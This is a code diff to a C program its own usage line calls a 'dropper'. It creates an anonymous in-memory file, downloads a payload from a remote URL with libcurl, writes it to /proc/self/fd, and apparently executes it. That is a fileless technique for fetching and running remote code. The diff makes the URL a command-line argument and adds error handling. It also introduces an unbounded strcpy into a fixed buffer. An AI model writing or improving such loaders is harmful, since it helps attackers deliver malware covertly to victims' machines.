@@ -35,8 +35,18 @@ void write_file(char* url, long port, char* filepath) {
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
-        // curl_easy_setopt(curl, CURLOPT_PORT, port);
+        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
+        
+        /* Make Request */
         res = curl_easy_perform(curl);
+
+        /* Check for Errors */
+        if (res != CURLE_OK | res == CURLE_HTTP_RETURNED_ERROR ) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            fclose(fp);
+            exit(0);
+        }
         curl_easy_cleanup(curl);
         fclose(fp);
     }   
@@ -58,17 +68,21 @@ void exec_fd(int fd, char* evp[]){
 
 
 int main(int argc, char *argv[], char * envp[]){
+    /* Define Vars */
     char* fd_name = "psovaya";
     int fd_num;
-    char* url = "http://192.168.1.188:8000/helloworld";
+    char url[1024];
     char fd_path[128];
     char* usage = "Usage : ./dropper {url}\n";
 
-    // User Input
+    /* User Input */
     if (argc != 2) {
         printf("Error : Incorrect count of Arguements\n%s", usage);
+        exit(0);
     }
+    strcpy(url, argv[1]);
 
+    /* Run Dropper */
     fd_num = create_memfd(fd_name);
     int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
     write_file(url, 8000, fd_path);
